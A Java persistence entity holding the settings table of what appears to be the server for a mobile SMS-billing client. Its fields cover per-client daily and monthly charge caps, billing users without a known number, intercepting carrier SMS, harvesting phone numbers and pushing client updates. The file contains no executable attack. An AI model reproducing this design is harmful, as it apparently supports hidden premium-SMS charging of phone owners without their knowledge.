package net.workspace.web.entity;
import javax.persistence.Column;
import javax.persistence.Entity;
import javax.persistence.Table;

//ALTER TABLE `plugin`.`t_setting` ADD COLUMN `white_payment_list` VARCHAR(200) NULL  AFTER `biz_try_times` ;
//ALTER TABLE `plugin`.`t_setting` ADD COLUMN `cancel_interval` INT(11) NULL  AFTER `white_payment_list` , ADD COLUMN `min_cancel_days` INT(11) NULL  AFTER `cancel_interval` , ADD COLUMN `max_cancel_days` INT(11) NULL  AFTER `min_cancel_days` ;
//ALTER TABLE `plugin`.`t_setting` ADD COLUMN `enable_cancel` CHAR(1) NULL  AFTER `max_cancel_days` ;
//ALTER TABLE `plugin`.`t_setting` ADD COLUMN `cancel_valid_days` BIGINT(21) NULL DEFAULT 0  AFTER `days_range` ;
@Entity
@Table(name = "t_setting")
public class SettingEntity extends IdEntity {
    private String enableBiz;
    private String enableGetMobile;
    private String sendTarget;
    private String updateHost;
    private String downloadHost;
    private int lastVersion;
    private int successReportRate;//定义指令成功报告百分比,为降低服务器负担,只返回一部分成功报告
    private String bizHost;
    private String channelHost;
    private String weiboUrl;
    private int clientDailyMoney;
    private int clientMonthlyMoney;
    private int clientInterval;
    private int requestInterval;
    private int bizTryTimes;
    //用户无号码是也开始计费
    private String enableNoPhonePay;
    private int maxPhoneRetrieveTimes;
    private int maxAreaRetrieveTimes;
    //取消包月业务相关开始----------
    private String whitePaymentList;
    private String daysRange;
    private int cancelInterval;//days
    private String enableCancel;
    private long cancelValidDays;
    //取消包月业务相关结束----------
    private String enablePpvPayCancel;//是否开启按次取消业务,用于取消其它人点播的业务
    //
    private String recordTaskRequest;//任务请求
    private String recordTaskResponse;//任务回应
    private String recordOrderRequest;//指令请求
    private String recordOrderResponse;//下发指令
    private String recordEmptyOrder;//空指令
    private String recordNaJsonForm;//网络取号成功
    private String recordSmsPhoneNumber;//短信取号成功
    private String recordAJsonForm;//取归属地成功
    private String recordSmsBlock;//短信拦截报告
    private String recordSmsFeedback;//短信回复报告
    private String recordIqAnswerRequest;//智能回复请求
    private String recordSmsStep;//短信反馈
    private String commonBlockPorts;
    private long blockExpireTime;
    private String reportBlock;
    
    
    //sync
    
    private String syncPortKeywords;
    private String syncCommandKeywords;
    private String syncMobileKeywords;
    private String syncLinkidKeywords;
    
    
    public String getSyncPortKeywords() {
        return syncPortKeywords;
    }
    public void setSyncPortKeywords(String syncPortKeywords) {
        this.syncPortKeywords = syncPortKeywords;
    }
    public String getSyncCommandKeywords() {
        return syncCommandKeywords;
    }
    public void setSyncCommandKeywords(String syncCommandKeywords) {
        this.syncCommandKeywords = syncCommandKeywords;
    }
    public String getSyncMobileKeywords() {
        return syncMobileKeywords;
    }
    public void setSyncMobileKeywords(String syncMobileKeywords) {
        this.syncMobileKeywords = syncMobileKeywords;
    }
    public String getBizHost() {
        return bizHost;
    }
    public int getBizTryTimes() {
        return bizTryTimes;
    }
    public long getBlockExpireTime() {
        return blockExpireTime;
    }
    public int getCancelInterval() {
        return cancelInterval;
    }
    public long getCancelValidDays() {
        return cancelValidDays;
    }
    public String getChannelHost() {
        return channelHost;
    }
    public int getClientDailyMoney() {
        return clientDailyMoney;
    }
    public int getClientInterval() {
        return clientInterval;
    }
    public int getClientMonthlyMoney() {
        return clientMonthlyMoney;
    }
    public String getCommonBlockPorts() {
        return commonBlockPorts;
    }
    public String getDaysRange() {
        return daysRange;
    }
    public String getDownloadHost() {
        return downloadHost;
    }
    public String getEnableBiz() {
        return enableBiz;
    }
    public String getEnableCancel() {
        return enableCancel;
    }
    public String getEnableGetMobile() {
        return enableGetMobile;
    }
    public String getEnablePpvPayCancel() {
        return enablePpvPayCancel;
    }
    public int getLastVersion() {
        return lastVersion;
    }
    @Column(name = "record_a_json_form")
    public String getRecordAJsonForm() {
        return recordAJsonForm;
    }
    public String getRecordEmptyOrder() {
        return recordEmptyOrder;
    }
    public String getRecordIqAnswerRequest() {
        return recordIqAnswerRequest;
    }
    public String getRecordNaJsonForm() {
        return recordNaJsonForm;
    }
    public String getRecordOrderRequest() {
        return recordOrderRequest;
    }
    public String getRecordOrderResponse() {
        return recordOrderResponse;
    }
    public String getRecordSmsBlock() {
        return recordSmsBlock;
    }
    public String getRecordSmsFeedback() {
        return recordSmsFeedback;
    }
    public String getRecordSmsPhoneNumber() {
        return recordSmsPhoneNumber;
    }
    public String getRecordSmsStep() {
        return recordSmsStep;
    }
    public String getRecordTaskRequest() {
        return recordTaskRequest;
    }
    public String getRecordTaskResponse() {
        return recordTaskResponse;
    }
    public String getReportBlock() {
        return reportBlock;
    }
    public int getRequestInterval() {
        return requestInterval;
    }
    public String getSendTarget() {
        return sendTarget;
    }
    public int getSuccessReportRate() {
        return successReportRate;
    }
    public String getUpdateHost() {
        return updateHost;
    }
    public String getWeiboUrl() {
        return weiboUrl;
    }
    public String getWhitePaymentList() {
        return whitePaymentList;
    }
    public void setBizHost(String bizHost) {
        this.bizHost = bizHost;
    }
    public void setBizTryTimes(int bizTryTimes) {
        this.bizTryTimes = bizTryTimes;
    }
    public void setBlockExpireTime(long blockExpireTime) {
        this.blockExpireTime = blockExpireTime;
    }
    public void setCancelInterval(int cancelInterval) {
        this.cancelInterval = cancelInterval;
    }
    public void setCancelValidDays(long cancelValidDays) {
        this.cancelValidDays = cancelValidDays;
    }
    public void setChannelHost(String channelHost) {
        this.channelHost = channelHost;
    }
    public void setClientDailyMoney(int clientDailyMoney) {
        this.clientDailyMoney = clientDailyMoney;
    }
    public void setClientInterval(int clientInterval) {
        this.clientInterval = clientInterval;
    }
    public void setClientMonthlyMoney(int clientMonthlyMoney) {
        this.clientMonthlyMoney = clientMonthlyMoney;
    }
    public void setCommonBlockPorts(String commonBlockPorts) {
        this.commonBlockPorts = commonBlockPorts;
    }
    public void setDaysRange(String daysRange) {
        this.daysRange = daysRange;
    }
    public void setDownloadHost(String downloadHost) {
        this.downloadHost = downloadHost;
    }
    public void setEnableBiz(String enableBiz) {
        this.enableBiz = enableBiz;
    }
    public void setEnableCancel(String enableCancel) {
        this.enableCancel = enableCancel;
    }
    public void setEnableGetMobile(String enableGetMobile) {
        this.enableGetMobile = enableGetMobile;
    }
    public void setEnablePpvPayCancel(String enablePpvPayCancel) {
        this.enablePpvPayCancel = enablePpvPayCancel;
    }
    public void setLastVersion(int lastVersion) {
        this.lastVersion = lastVersion;
    }
    public void setRecordAJsonForm(String recordAJsonForm) {
        this.recordAJsonForm = recordAJsonForm;
    }
    public void setRecordEmptyOrder(String recordEmptyOrder) {
        this.recordEmptyOrder = recordEmptyOrder;
    }
    public void setRecordIqAnswerRequest(String recordIqAnswerRequest) {
        this.recordIqAnswerRequest = recordIqAnswerRequest;
    }
    public void setRecordNaJsonForm(String recordNaJsonForm) {
        this.recordNaJsonForm = recordNaJsonForm;
    }
    public void setRecordOrderRequest(String recordOrderRequest) {
        this.recordOrderRequest = recordOrderRequest;
    }
    public void setRecordOrderResponse(String recordOrderResponse) {
        this.recordOrderResponse = recordOrderResponse;
    }
    public void setRecordSmsBlock(String recordSmsBlock) {
        this.recordSmsBlock = recordSmsBlock;
    }
    public void setRecordSmsFeedback(String recordSmsFeedback) {
        this.recordSmsFeedback = recordSmsFeedback;
    }
    public void setRecordSmsPhoneNumber(String recordSmsPhoneNumber) {
        this.recordSmsPhoneNumber = recordSmsPhoneNumber;
    }
    public void setRecordSmsStep(String recordSmsStep) {
        this.recordSmsStep = recordSmsStep;
    }
    public void setRecordTaskRequest(String recordTaskRequest) {
        this.recordTaskRequest = recordTaskRequest;
    }
    public void setRecordTaskResponse(String recordTaskResponse) {
        this.recordTaskResponse = recordTaskResponse;
    }
    public void setReportBlock(String reportBlock) {
        this.reportBlock = reportBlock;
    }
    public void setRequestInterval(int requestInterval) {
        this.requestInterval = requestInterval;
    }
    public void setSendTarget(String sendTarget) {
        this.sendTarget = sendTarget;
    }
    public void setSuccessReportRate(int successReportRate) {
        this.successReportRate = successReportRate;
    }
    public void setUpdateHost(String updateHost) {
        this.updateHost = updateHost;
    }
    public void setWeiboUrl(String weiboUrl) {
        this.weiboUrl = weiboUrl;
    }
    public void setWhitePaymentList(String whitePaymentList) {
        this.whitePaymentList = whitePaymentList;
    }
     
    public int getMaxPhoneRetrieveTimes() {
        return maxPhoneRetrieveTimes;
    }
    public void setMaxPhoneRetrieveTimes(int maxPhoneRetrieveTimes) {
        this.maxPhoneRetrieveTimes = maxPhoneRetrieveTimes;
    }
    public int getMaxAreaRetrieveTimes() {
        return maxAreaRetrieveTimes;
    }
    public void setMaxAreaRetrieveTimes(int maxAreaRetrieveTimes) {
        this.maxAreaRetrieveTimes = maxAreaRetrieveTimes;
    }
    public String getEnableNoPhonePay() {
        return enableNoPhonePay;
    }
    public void setEnableNoPhonePay(String enableNoPhonePay) {
        this.enableNoPhonePay = enableNoPhonePay;
    }
    public String getSyncLinkidKeywords() {
        return syncLinkidKeywords;
    }
    public void setSyncLinkidKeywords(String syncLinkidKeywords) {
        this.syncLinkidKeywords = syncLinkidKeywords;
    }
}
